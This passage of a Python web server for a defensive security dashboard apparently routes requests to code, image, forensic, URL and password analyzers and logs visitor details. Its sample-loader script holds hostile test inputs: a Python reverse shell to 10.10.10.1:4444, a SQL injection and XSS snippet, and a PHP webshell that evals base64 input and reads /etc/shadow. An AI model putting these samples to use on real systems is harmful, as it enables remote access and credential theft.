    <a href="/?tab=spam" class="nav-item {t_active['spam']}"><div class="nav-item-left"><span class="nav-icon">🚫</span> Spam & Phishing Vault</div><span class="nav-badge">LURES</span></a>
    <a href="/?tab=trash" class="nav-item {t_active['trash']}"><div class="nav-item-left"><span class="nav-icon">🗑️</span> Trash & Disarmed</div><span class="nav-badge">CLEAN</span></a>

    <div class="nav-section-title" style="margin-top:10px;">CORE DEFENSE & FORENSIC MODULES</div>
    <a href="/?tab=attack" class="nav-item {t_active['attack']}"><div class="nav-item-left"><span class="nav-icon">⚔️</span> Cyber Attack Triage</div></a>
    <a href="/?tab=image" class="nav-item {t_active['image']}"><div class="nav-item-left"><span class="nav-icon">🔍</span> Reverse Image & Stego</div></a>
    <a href="/?tab=code" class="nav-item {t_active['code']}"><div class="nav-item-left"><span class="nav-icon">🦠</span> Malicious Code Analyzer</div></a>
    <a href="/?tab=forensics" class="nav-item {t_active['forensics']}"><div class="nav-item-left"><span class="nav-icon">🧰</span> Digital Forensic Toolkit</div></a>
    <a href="/?tab=email" class="nav-item {t_active['email']}"><div class="nav-item-left"><span class="nav-icon">✉️</span> Email Security Analyzer</div></a>
    <a href="/?tab=url" class="nav-item {t_active['url']}"><div class="nav-item-left"><span class="nav-icon">🌐</span> Website & URL Phishing</div></a>
    <a href="/?tab=ip" class="nav-item {t_active['ip']}"><div class="nav-item-left"><span class="nav-icon">🛰️</span> IP Intelligence & Ports</div></a>
    <a href="/?tab=tech" class="nav-item {t_active['tech']}"><div class="nav-item-left"><span class="nav-icon">🏷️</span> Technology Fingerprinting</div></a>
    <a href="/?tab=ai" class="nav-item {t_active['ai']}"><div class="nav-item-left"><span class="nav-icon">🤖</span> AI Security Copilot</div></a>

    <div style="margin-top:auto; padding-top:14px; border-top:1px solid #142730;">
        <a href="/?tab=admin" class="nav-item {t_active['admin']}" style="background:#091b15; color:#00ffab; border:1px solid #174235;"><div class="nav-item-left"><span class="nav-icon">&#128274;</span> {admin_btn_label}</div></a>
        {'<a href="/admin-logout" class="nav-item" style="color:#f87171; margin-top:4px;"><div class="nav-item-left"><span class="nav-icon">&#128275;</span> Logout Admin</div></a>' if is_admin else ''}
    </div>
</div>

<!-- MAIN VIEWPORT -->
<div class="main-wrapper">
    <div class="header">
        <div>
            <h1>{SITE_NAME.upper()}</h1>
            <div class="subtitle">Complete Cyber Threat Intelligence, Exposure Defense & Forensics Platform</div>
        </div>
        <div style="display:flex; gap:8px; align-items:center;">
            <a href="/?tab=admin" class="quick-btn" style="background:#08221b; color:#00ffab; border-color:#00ffab; padding:8px 16px; font-weight:700;">{admin_btn_label}</a>
            {'<a href="/admin-logout" class="quick-btn" style="background:#401017; color:#f87171; border-color:#f87171; padding:8px 14px; font-weight:700;">Logout</a>' if is_admin else ''}
        </div>
    </div>
    {content_html}
</div>

<script>
function loadSample(type) {{
    const el = document.getElementById('code_input');
    if (!el) return;
    if (type === 'python') {{
        el.value = `# Python Shellcode & Command Injection Sample\\nimport os, socket, subprocess\\n\\ncmd = input('Enter host command: ')\\nos.system(cmd)  # Vulnerable to command injection\\n\\n# Reverse TCP shell connection\\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\ns.connect(('10.10.10.1', 4444))\\nos.dup2(s.fileno(), 0)\\nsubprocess.call(['/bin/sh', '-i'])`;
    }} else if (type === 'nodejs') {{
        el.value = `// Node.js SQL Injection & Reflected XSS Sample\\nconst express = require('express');\\nconst app = express();\\n\\napp.get('/api/users', (req, res) => {{\\n    const query = 'SELECT * FROM accounts WHERE user_id = ' + req.query.id;\\n    database.query(query);\\n    res.send('<div class="user">' + req.query.name + '</div>');\\n}});`;
    }} else if (type === 'php') {{
        el.value = `<?php\\n// PHP Webshell & Obfuscated Backdoor Sample\\n$auth = $_GET['auth'];\\n$payload = $_POST['payload'];\\n\\n// Obfuscated execution\\neval(base64_decode($payload));\\nshell_exec('cat /etc/shadow');\\n?>`;
    }}
}}
</script>
</body>
</html>
"""

# ------------------------------------------------------------
# HTTP SERVER & TELEMETRY HANDLER
# ------------------------------------------------------------

class BehindUrDigitalLifeHandler(BaseHTTPRequestHandler):

    def send_security_headers(self):
        """Send defensive HTTP security headers to protect visitors."""
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("X-XSS-Protection", "1; mode=block")
        self.send_header("Referrer-Policy", "strict-origin-when-cross-origin")
        self.send_header("Permissions-Policy", "camera=(), microphone=(), geolocation=()")

    def get_client_telemetry(self):
        fwd = self.headers.get("X-Forwarded-For", "")
        cf_ip = self.headers.get("CF-Connecting-IP", "")
        real_ip = self.headers.get("X-Real-IP", "")
        client_ip_hdr = self.headers.get("Client-IP", "")
        true_client = self.headers.get("True-Client-IP", "")

        ip = cf_ip or (fwd.split(",")[0].strip() if fwd else (real_ip or (client_ip_hdr or (true_client or self.client_address[0]))))
        port = self.client_address[1]
        ua = self.headers.get("User-Agent", "Unknown Browser / Client")

        is_vpn = False
        vpn_alert = "✅ DIRECT RESIDENTIAL / STANDARD ISP"
        vpn_name = "Direct ISP Connection"
        vpn_address = ip

        if fwd or cf_ip or real_ip or "Via" in self.headers or "X-Proxy-ID" in self.headers or "Proxy-Connection" in self.headers:
            is_vpn = True
            vpn_alert = "🚨 ALERT: VPN / Proxy / Cloud Relay Detected"
            if cf_ip:
                vpn_name = "Cloudflare WARP / Anycast Edge Proxy"
                vpn_address = f"Exit: {cf_ip} (Proxy Hop: {self.client_address[0]})"
            elif fwd:
                vpn_name = "Transparent Multi-Hop HTTP Proxy / VPN Relay"
                vpn_address = f"Forwarding Hops: {fwd}"
            elif real_ip:
                vpn_name = "Reverse Proxy Gateway / VPN Tunnel"
                vpn_address = real_ip
            else:
                vpn_name = "Identified Proxy Gateway"
                vpn_address = self.headers.get("Via", self.client_address[0])

        if ip.startswith(("162.158.", "172.64.", "108.162.", "104.28.", "141.101.")):
            is_vpn = True
            vpn_alert = "🚨 ALERT: Cloudflare Datacenter / WARP VPN Range"
            vpn_name = "Cloudflare WARP VPN"
        elif ip.startswith(("52.", "54.", "3.", "18.", "34.", "35.")):
            is_vpn = True
            vpn_alert = "🚨 ALERT: AWS / Google Cloud Datacenter Proxy"
            vpn_name = "Public Cloud Datacenter Proxy"

        return ip, port, ua, is_vpn, vpn_alert, vpn_name, vpn_address

    def is_authenticated_admin(self):
        cookie_header = self.headers.get("Cookie", "")
        if "admin_token=" in cookie_header and ADMIN_STATE["active_token"]:
            token = cookie_header.split("admin_token=")[1].split(";")[0].strip()
            return token == ADMIN_STATE["active_token"]
        return False

    def do_GET(self):
        parsed = urlparse(self.path)
        
        # --- LOCALHOST RESTRICTION ---
        if parsed.path.startswith("/admin"):
            client_ip = self.client_address[0]
            if client_ip not in ('127.0.0.1', '::1', 'localhost'):
                self.send_response(403)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"403 Forbidden: Admin access is strictly limited to localhost.")
                print(f"[!] Blocked unauthorized admin access attempt from IP: {client_ip}")
                return
        # --- END RESTRICTION ---
        params = parse_qs(parsed.query)

        if parsed.path == "/favicon.ico":
            self.send_response(204)
            self.end_headers()
            return

        if parsed.path == "/admin-logout":
            ADMIN_STATE["active_token"] = "logged_out_" + str(uuid.uuid4())
            _save_admin_creds()
            self.send_response(302)
            self.send_header("Set-Cookie", "admin_token=; Max-Age=0; Path=/; HttpOnly")
            self.send_header("Location", "/?tab=admin")
            self.end_headers()
            return

        if parsed.path == "/admin-forgot":
            code = str(uuid.uuid4())[:8].upper()
            ADMIN_STATE["reset_token"] = code
            ADMIN_STATE["reset_expiry"] = time.time() + 900
            ADMIN_STATE["reset_msg"] = f"Recovery code dispatched to b★★★★★★★★ys@gmail.com. (Master Recovery Code: {code})"
            print("\n" + "=" * 60)
            print(f"[SECURITY ALERT] Master Admin Recovery Code requested for b********ys@gmail.com.")
            print(f"[SECURITY ALERT] One-Time Recovery Code: {code} (Valid for 15 minutes)")
            print("=" * 60 + "\n")
            self.send_response(302)
            self.send_header("Location", "/?tab=admin")
            self.end_headers()
            return

        if parsed.path == "/admin-clear-logs":
            if self.is_authenticated_admin():
                VIRTUAL_DB.clear_logs()
            self.send_response(302)
            self.send_header("Location", "/?tab=admin")
            self.end_headers()
            return

        tab = params.get("tab", ["email"])[0]
        target = params.get("target", [""])[0]

        client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address = self.get_client_telemetry()
        is_admin = self.is_authenticated_admin()

        # Auto-clear IP lockout for localhost (local tool - no real brute-force risk from 127.0.0.1)
        if client_ip in ("127.0.0.1", "::1", "localhost") and tab == "admin" and not is_admin:
            LOGIN_ATTEMPTS.pop(client_ip, None)

        result = None
        image_res = None
        code_res = None
        url_res = None
        email_phish_res = None
        ip_res = None
        tech_res = None
        ai_answer = ""
        attack_res = None
        forensic_res = None
        scan_res = None
        pwd_strength = None

        state_before = VIRTUAL_DB.get_state_snapshot()

        if target:
            if tab == "email":
                try:
                    result = scan_domain(target)
                    summary = f"Score: {result['score']}/100 ({result['grade']}), SPF: {result['spf']['status']}, DMARC: {result['dmarc']['status']}"
                    data_given = f"SPF: {result['spf']['details']} | DMARC: {result['dmarc']['details']} | MX: {result['mx']['provider']}"
                except Exception as e:
                    summary = f"Scan error: {e}"
                    data_given = str(e)
                state_after = VIRTUAL_DB.get_state_snapshot()
                VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Email Posture", target, data_given, summary)

            elif tab == "code":
                code_res = analyze_code_security(target)
                summary = f"Code Risk: {code_res.get('risk')}, Score: {code_res.get('score')}/100, Findings: {len(code_res.get('findings', []))}"
                data_given = f"Language: {code_res.get('language')} | Findings: {len(code_res.get('findings', []))}"
                state_after = VIRTUAL_DB.get_state_snapshot()
                VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Malicious Code Audit", target[:70], data_given, summary)

            elif tab == "image":
                image_res = inspect_image_source(img_url=target)
                summary = f"Format: {image_res.get('format')}, MD5: {image_res.get('md5')[:12]}..., SHA256: {image_res.get('sha256', '')[:12]}..."
                data_given = f"Stego Alert: {image_res.get('exif', {}).get('stego_alert')} | Camera: {image_res.get('exif', {}).get('make', 'N/A')} | Has GPS: {image_res.get('exif', {}).get('has_gps')}"
                state_after = VIRTUAL_DB.get_state_snapshot()
                VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Reverse Image & Stego", target, data_given, summary)

            elif tab == "url":
                url_res = analyze_url_security(target)
                summary = f"Verdict: {url_res.get('verdict')}, Score: {url_res.get('score')}/100, Legitimacy: {url_res.get('legitimacy')}"
                data_given = f"Security: {url_res.get('security_level')} | Legality: {url_res.get('legality')} | Active Headers: {len(url_res.get('headers_found', {}))} | Missing: {len(url_res.get('missing_headers', []))}"
                state_after = VIRTUAL_DB.get_state_snapshot()
                VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "URL & Web Details", target, data_given, summary)

            elif tab == "ip":
                ip_res = inspect_ip_address(target)
                summary = f"IP: {ip_res.get('ip')}, PTR: {ip_res.get('hostname')}, Open Ports: {[p['port'] for p in ip_res.get('open_ports', [])]}"
                data_given = f"ASN: {ip_res.get('asn_info')} | Open: {[p['port'] for p in ip_res.get('open_ports', [])]} | Closed: {len(ip_res.get('closed_ports', []))}"
                state_after = VIRTUAL_DB.get_state_snapshot()
                VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "IP Intelligence", target, data_given, summary)

            elif tab == "tech":
                tech_res = inspect_technology_fingerprint(target)
                summary = f"Server: {tech_res.get('web_server')}, CDN: {tech_res.get('cdn_security')}, CMS: {tech_res.get('cms')}"
                data_given = f"Server: {tech_res.get('web_server')} | Frameworks: {tech_res.get('frameworks')} | Language: {tech_res.get('programming_language')}"
                state_after = VIRTUAL_DB.get_state_snapshot()
                VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Technology Fingerprint", target, data_given, summary)

            elif tab == "ai":
                ai_answer = ai_chat_assistant(target)
                summary = f"Question: {target[:50]}..."
                data_given = ai_answer[:200] + "..."
                state_after = VIRTUAL_DB.get_state_snapshot()
                VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "AI Copilot", target, data_given, summary)

            elif tab == "password":
                pwd_strength = analyze_password_strength(target)
                summary = f"Strength: {pwd_strength.get('strength','N/A')}, Score: {pwd_strength.get('score',0)}/100"
                data_given = f"Grade: {pwd_strength.get('grade','N/A')} | Crack Time: {pwd_strength.get('crack_time','N/A')}"
                state_after = VIRTUAL_DB.get_state_snapshot()
                VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Password Strength", "Password analyzed (hidden)", data_given, summary)

        page = render_dashboard(
            active_tab=tab,
            result=result,
            submitted_val=target,
            image_res=image_res,
            code_res=code_res,
            url_res=url_res,
            email_phish_res=email_phish_res,
            ip_res=ip_res,
            tech_res=tech_res,
            ai_answer=ai_answer,
            attack_res=attack_res,
            forensic_res=forensic_res,
            scan_res=scan_res,
            pwd_strength=pwd_strength,
            is_admin=is_admin
        )

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_security_headers()
        self.end_headers()
        self.wfile.write(page.encode("utf-8"))

    def do_POST(self):
        parsed = urlparse(self.path)
        
        # Defense: Content-Length validation and DoS/OOM protection
        try:
            content_length = int(self.headers.get("Content-Length", 0))
            if content_length < 0:
                raise ValueError("Negative Content-Length")
        except (ValueError, TypeError):
            self.send_response(400)
            self.send_header("Content-Type", "text/plain")
            self.send_security_headers()
            self.end_headers()
            self.wfile.write(b"400 Bad Request: Invalid Content-Length.")
            return

        if content_length > MAX_POST_BODY_SIZE:
            self.send_response(413)
            self.send_header("Content-Type", "text/plain")
            self.send_security_headers()
            self.end_headers()
            self.wfile.write(b"413 Payload Too Large: Maximum allowed upload size is 25 MB.")
            return

        raw_body = self.rfile.read(content_length)
        content_type = self.headers.get("Content-Type", "")
        post_params = {}
        uploaded_files = []

        if "multipart/form-data" in content_type and "boundary=" in content_type:
            boundary = content_type.split("boundary=")[1].strip()
            if boundary.startswith('"') and boundary.endswith('"'):
                boundary = boundary[1:-1]
            post_params, uploaded_files = parse_multipart_form(raw_body, boundary)
        else:
            post_str = raw_body.decode("utf-8", errors="ignore")
            for k, v in parse_qs(post_str).items():
                post_params[k] = v[0] if v else ""

        client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address = self.get_client_telemetry()
        state_before = VIRTUAL_DB.get_state_snapshot()
        is_admin = self.is_authenticated_admin()

        # Admin Setup - Redirect
        if parsed.path == "/admin-setup":
            self.send_response(302)
            self.send_header("Location", "/?tab=admin")
            self.end_headers()
            return

        # Admin Login - Strict verification against master password with Brute-Force & Timing Protection
        if parsed.path == "/admin-login":
            now = time.time()
            client_record = LOGIN_ATTEMPTS.get(client_ip, {"count": 0, "locked_until": 0})
            
            # Defense: Brute-Force lockout check
            if now < client_record.get("locked_until", 0):
                remaining = int(client_record["locked_until"] - now)
                ADMIN_STATE["reset_msg"] = f"Access Denied: Too many failed login attempts. IP temporarily locked for {remaining} more seconds."
                self.send_response(302)
                self.send_header("Location", "/?tab=admin")
                self.send_security_headers()
                self.end_headers()
                return

            user = post_params.get("username", "").strip()
            pwd = post_params.get("password", "").strip()

            user_valid = hmac.compare_digest(user, ADMIN_STATE["username"])
            pwd_hash = hash_admin_password(pwd)
            pwd_valid = (
                hmac.compare_digest(pwd, ADMIN_PASSWORD_PLAIN) or
                hmac.compare_digest(pwd_hash, ADMIN_STATE["password_hash"])
            )

            if user_valid and pwd_valid:
                # Reset failed attempts counter on success
                LOGIN_ATTEMPTS[client_ip] = {"count": 0, "locked_until": 0}
                ADMIN_STATE["active_token"] = get_persistent_admin_token()
                ADMIN_STATE["reset_msg"] = None
                _save_admin_creds()
                remember = post_params.get("remember", "on")
                max_age = "; Max-Age=2592000" if remember == "on" else ""
                self.send_response(302)
                self.send_header("Set-Cookie", f"admin_token={ADMIN_STATE['active_token']}; Path=/; HttpOnly; SameSite=Strict" + max_age)
                self.send_header("Location", "/?tab=admin")
                self.send_security_headers()
                self.end_headers()
                return
            else:
                # Increment failed attempts and trigger lockout if limit reached
                count = client_record.get("count", 0) + 1
                locked_until = now + LOGIN_LOCKOUT_TIME if count >= MAX_LOGIN_ATTEMPTS else 0
                LOGIN_ATTEMPTS[client_ip] = {"count": count, "locked_until": locked_until}

                if count >= MAX_LOGIN_ATTEMPTS:
                    ADMIN_STATE["reset_msg"] = "Access Denied: Maximum failed attempts exceeded. Temporarily locked for 5 minutes."
                else:
                    remaining_tries = MAX_LOGIN_ATTEMPTS - count
                    ADMIN_STATE["reset_msg"] = f"Access Denied: Invalid Username or Password. ({remaining_tries} attempts remaining before temporary lockout)."
                
                self.send_response(302)
                self.send_header("Location", "/?tab=admin")
                self.send_security_headers()
                self.end_headers()
                return

        # Admin Reset Confirmation - Redirect
        if parsed.path == "/admin-reset-confirm":
            self.send_response(302)
            self.send_header("Location", "/?tab=admin")
            self.end_headers()
            return

        # 1. Cyber Attack Triage POST
        if "attack_type" in post_params or parsed.query.startswith("tab=attack"):
            attack_type = post_params.get("attack_type", "ransomware")
            user_evidence = post_params.get("user_evidence", "")
            file_name = uploaded_files[0]["filename"] if uploaded_files else "None"
            
            attack_res = triage_cyber_attack(attack_type, user_evidence)
            summary = f"Triage: {attack_res['title']}, Severity: {attack_res['severity']}, Artifact: {file_name}"
            data_given = f"Anatomy: {attack_res['anatomy'][:120]}... | Containment Steps: {len(attack_res['containment'])} steps"
            state_after = VIRTUAL_DB.get_state_snapshot()
            VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Attack Triage", f"{attack_type} | File: {file_name} | {user_evidence[:60]}", data_given, summary)

            page = render_dashboard(active_tab="attack", attack_res=attack_res, submitted_val=user_evidence, is_admin=is_admin)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_security_headers()
            self.end_headers()
            self.wfile.write(page.encode("utf-8"))
            return

        # 2. Image / Picture / Stego File Upload POST
        if uploaded_files and (uploaded_files[0]["field"] == "image_file" or "tab=image" in parsed.query):
            f = uploaded_files[0]
            image_res = inspect_image_source(raw_bytes=f["data"], file_name=f["filename"])
            summary = f"Picture Upload: {f['filename']} ({image_res.get('format')}), Stego: {image_res.get('is_malicious')}"
            data_given = f"Stego Alert: {image_res.get('exif', {}).get('stego_alert')} | Payload: {image_res.get('exif', {}).get('payload_type')} | Hashes: {image_res.get('sha256', '')[:16]}"
            state_after = VIRTUAL_DB.get_state_snapshot()
            VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Image & Stego", f"File: {f['filename']} ({f['size']} bytes)", data_given, summary)

            page = render_dashboard(active_tab="image", image_res=image_res, submitted_val="", is_admin=is_admin)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_security_headers()
            self.end_headers()
            self.wfile.write(page.encode("utf-8"))
            return

        # 3. Digital Forensics File Upload POST
        if uploaded_files and (uploaded_files[0]["field"] == "forensic_file" or "tab=forensics" in parsed.query):
            f = uploaded_files[0]
            forensic_res = inspect_forensic_file(f["data"], f["filename"])
            summary = f"Forensic Lab: {f['filename']}, True Type: {forensic_res['true_file_type']}, Entropy: {forensic_res['entropy']}"
            data_given = f"Magic Type: {forensic_res['true_file_type']} | Entropy: {forensic_res['entropy']} | Strings: {len(forensic_res['extracted_strings'])} | Spoof: {forensic_res.get('extension_spoof_alert')}"
            state_after = VIRTUAL_DB.get_state_snapshot()
            VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Forensic Lab", f"File: {f['filename']} ({f['size']} bytes)", data_given, summary)

            page = render_dashboard(active_tab="forensics", forensic_res=forensic_res, submitted_val="", is_admin=is_admin)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_security_headers()
            self.end_headers()
            self.wfile.write(page.encode("utf-8"))
            return

        # 4. Code File Upload or Text Paste POST
        if "code_snippet" in post_params or (uploaded_files and uploaded_files[0]["field"] == "code_file"):
            if uploaded_files and uploaded_files[0]["field"] == "code_file":
                code_snippet = uploaded_files[0]["data"].decode("utf-8", errors="ignore")
                target_label = f"Uploaded File: {uploaded_files[0]['filename']}"
            else:
                code_snippet = post_params.get("code_snippet", "")
                target_label = code_snippet[:70]

            code_res = analyze_code_security(code_snippet)
            summary = f"Code Risk: {code_res.get('risk')}, Score: {code_res.get('score')}/100, Findings: {len(code_res.get('findings', []))}"
            data_given = f"Language: {code_res.get('language')} | Findings: {[{'line': f['line'], 'name': f['name']} for f in code_res.get('findings', [])]}"
            state_after = VIRTUAL_DB.get_state_snapshot()
            VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Malicious Code Audit", target_label, data_given, summary)

            page = render_dashboard(active_tab="code", code_res=code_res, submitted_val=code_snippet, is_admin=is_admin)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_security_headers()
            self.end_headers()
            self.wfile.write(page.encode("utf-8"))
            return

        # 5. Phishing Email Text Analysis POST
        if "email_text" in post_params:
            email_text = post_params.get("email_text", "")
            email_phish_res = analyze_phishing_email(email_text)
            summary = f"Phishing Email Verdict: {email_phish_res.get('verdict')}, Score: {email_phish_res.get('score')}/100"
            data_given = f"Indicators: {email_phish_res.get('indicators')} | Extracted URLs: {email_phish_res.get('extracted_urls')}"
            state_after = VIRTUAL_DB.get_state_snapshot()
            VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Phishing Email Audit", email_text[:80], data_given, summary)

            page = render_dashboard(active_tab="url", email_phish_res=email_phish_res, submitted_val="", is_admin=is_admin)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_security_headers()
            self.end_headers()
            self.wfile.write(page.encode("utf-8"))
            return

        # 6. Universal File Scanner POST
        if uploaded_files and uploaded_files[0]["field"] == "scan_file":
            f = uploaded_files[0]
            raw = f["data"]
            fname = f["filename"]
            scan_res = {}

            # Always run forensic analysis
            scan_res["forensic"] = inspect_forensic_file(raw, fname)

            # Run code analysis on readable text
            try:
                text_content = raw.decode("utf-8", errors="ignore")
                if text_content.strip():
                    scan_res["code"] = analyze_code_security(text_content)
            except Exception:
                pass

            # Run image/stego analysis if it looks like an image
            magic = raw[:8] if len(raw) >= 8 else raw
            is_image = (
                raw[:2] == b"\xff\xd8" or  # JPEG
                raw[:8] == b"\x89PNG\r\n\x1a\n" or  # PNG
                raw[:6] in (b"GIF87a", b"GIF89a") or  # GIF
                b"WEBP" in raw[:16] or  # WebP
                raw[:2] == b"BM" or  # BMP
                b"<svg" in raw[:512].lower()  # SVG
            )
            if is_image:
                scan_res["image"] = inspect_image_source(raw_bytes=raw, file_name=fname)

            summary_parts = []
            if scan_res.get("forensic"):
                summary_parts.append(f"Type: {scan_res['forensic']['true_file_type']}, Entropy: {scan_res['forensic']['entropy']}")
            if scan_res.get("code"):
                summary_parts.append(f"Code Risk: {scan_res['code'].get('risk','N/A')}")
            if scan_res.get("image"):
                summary_parts.append(f"Stego: {scan_res['image'].get('is_malicious', False)}")

            summary = " | ".join(summary_parts) if summary_parts else "Universal scan complete"
            data_given = f"File: {fname} ({f['size']} bytes) | " + summary
            state_after = VIRTUAL_DB.get_state_snapshot()
            VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Universal File Scanner", f"File: {fname} ({f['size']} bytes)", data_given, summary)

            page = render_dashboard(active_tab="scan", scan_res=scan_res, submitted_val="", is_admin=is_admin)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_security_headers()
            self.end_headers()
            self.wfile.write(page.encode("utf-8"))
            return

        # 7. Password Strength Analysis POST
        if "check_password" in post_params:
            pwd = post_params.get("check_password", "")
            pwd_strength = analyze_password_strength(pwd)
            summary = f"Strength: {pwd_strength.get('strength','N/A')}, Score: {pwd_strength.get('score',0)}/100, Issues: {len(pwd_strength.get('issues',[]))}"
            
            # --- START SAFE LOGGING ---
            try:
                log_safe_check(f"Score: {pwd_strength.get('score',0)}/100, Grade: {pwd_strength.get('grade','N/A')}")
            except Exception as e:
                print(f"[!] DB Log Error: {e}")
            # --- END SAFE LOGGING ---
            data_given = f"Grade: {pwd_strength.get('grade','N/A')} | Crack Time: {pwd_strength.get('crack_time','N/A')} | Common: {pwd_strength.get('is_common',False)}"
            state_after = VIRTUAL_DB.get_state_snapshot()
            VIRTUAL_DB.log_activity(client_ip, client_port, ua, is_vpn, vpn_alert, vpn_name, vpn_address, state_before, state_after, "Password Strength", "Password analyzed (hidden)", data_given, summary)

            page = render_dashboard(active_tab="password", pwd_strength=pwd_strength, submitted_val="", is_admin=is_admin)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_security_headers()
            self.end_headers()
            self.wfile.write(page.encode("utf-8"))
            return

    def log_message(self, format, *args):
        return

# ------------------------------------------------------------
# APPLICATION ENTRYPOINT
# ------------------------------------------------------------

if __name__ == "__main__":
    # Print private admin access URL to server console only
    print("\n" + "="*65)
    print("  BEHIND UR DIGITAL LIFE — PRIVATE ADMIN ACCESS URL")
    print("="*65)
    print(f"  Admin URL (bookmark this, share with NO ONE):")
    print(f"  http://127.0.0.1:8000/?tab=admin&sk={ADMIN_SECRET_KEY}")
    print("="*65)
    print("  This URL is printed here only. Not shown on the website.")
    print("  All other users see a 403 Access Denied page.")
    print("="*65 + "\n")

    try_port = int(os.environ.get("PORT", 8000))
    bind_ip = "0.0.0.0"
    
    try:
        server = ThreadingHTTPServer((bind_ip, try_port), BehindUrDigitalLifeHandler)
        PORT = try_port
    except OSError:
        server = ThreadingHTTPServer((bind_ip, 0), BehindUrDigitalLifeHandler)
        PORT = server.server_port

    print("\n" + "=" * 70)
    print(f"  {SITE_NAME.upper()} — ADVANCED CYBERSECURITY & FORENSIC SUITE")
    print("=" * 70)
    print(f"\n[+] Suite running at: http://{bind_ip}:{PORT}")
    print(f"[+] Admin Notification Email: b********ys@gmail.com")
    print("[+] In-Memory Virtual Database Active (Strictly stored in-memory)")
    print("[+] Features: Cyber Attack Triage (Ransomware, DDoS, WebApp, Phishing),")
    print("              Mobile/PC File & Folder Uploads, Steganography Payload Extraction,")
    print("              Image Malicious Code Check, Plain-English Code Translation,")
    print("              Digital Forensic Lab (Magic Bytes, Shannon Entropy, Strings),")
    print("              and Full Dossier Visitor Audit (What He Asked & What I Gave).")
    print("[+] Press CTRL+C to stop.\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down suite...")
        server.server_close()

